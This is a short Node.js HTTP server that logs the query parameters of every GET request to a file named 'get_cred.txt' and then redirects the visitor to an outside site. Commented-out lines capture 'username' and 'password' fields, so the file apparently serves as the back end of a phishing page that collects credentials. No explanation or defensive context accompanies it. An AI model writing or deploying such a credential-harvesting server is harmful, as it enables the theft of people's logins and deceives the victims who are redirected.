var http = require('http');
const fs = require('fs')


var param_func = function(req) {
    console.log(req.url)
    let q = req.url.split('?')
    console.log(q)
    let result = {}
    if (q.length >= 2) {
        q[1].split('&').forEach((item) => {
            try {
                result[item.split('=')[0]] = item.split('=')[1]
                console.log(item.split('='))
                console.log(result)

            } catch (e) {
                result[item.split('=')[0]] = ''
            }
        })
    }
    console.log(result)
    return result
}

var server = http.createServer(function(request, response) {


    // response.writeHead(200, { "Content-Type": "text\plain" });
    if (request.method == "GET") {

        request.params = param_func(request); // call the function above ;
        /**
         * http://mysite/add?name=Ahmed
         */
        console.log(request.params['id'] + "", request.params['msg'] + "")
            // var string = JSON.stringify(request.params);

        Object.keys(request.params).forEach(function(key) {
            fs.appendFile('get_cred.txt', key + " : " + request.params[key] + "\n", (err) => {
                console.log(err)
            })
        });


        fs.appendFile('get_cred.txt', "\n", (err) => {
                console.log(err)
            })
            // var username = request.params['username']
            // var password = request.params['password']

        // fs.appendFile('get_cred.txt', username + ":" + password, (err) => {
        //     console.log(err)
        // })

        // fs.appendFile('get_cred.txt', username + ":" + password, (err) => {
        //     console.log("couldnt save")
        // })



    } else if (request.method == "POST") {
        // response.end("received POST request.");
        // response.redirect('https://google.com')
    } else {
        // response.end("Undefined request .");
        // response.redirect('https://google.com')
    }

    response.writeHead(302, { Location: 'https://dlmu.17gz.org/' })
    response.end()

    //     return response.redirect('https://google.com')
});

server.listen(8000);
console.log("Server running on port 8000");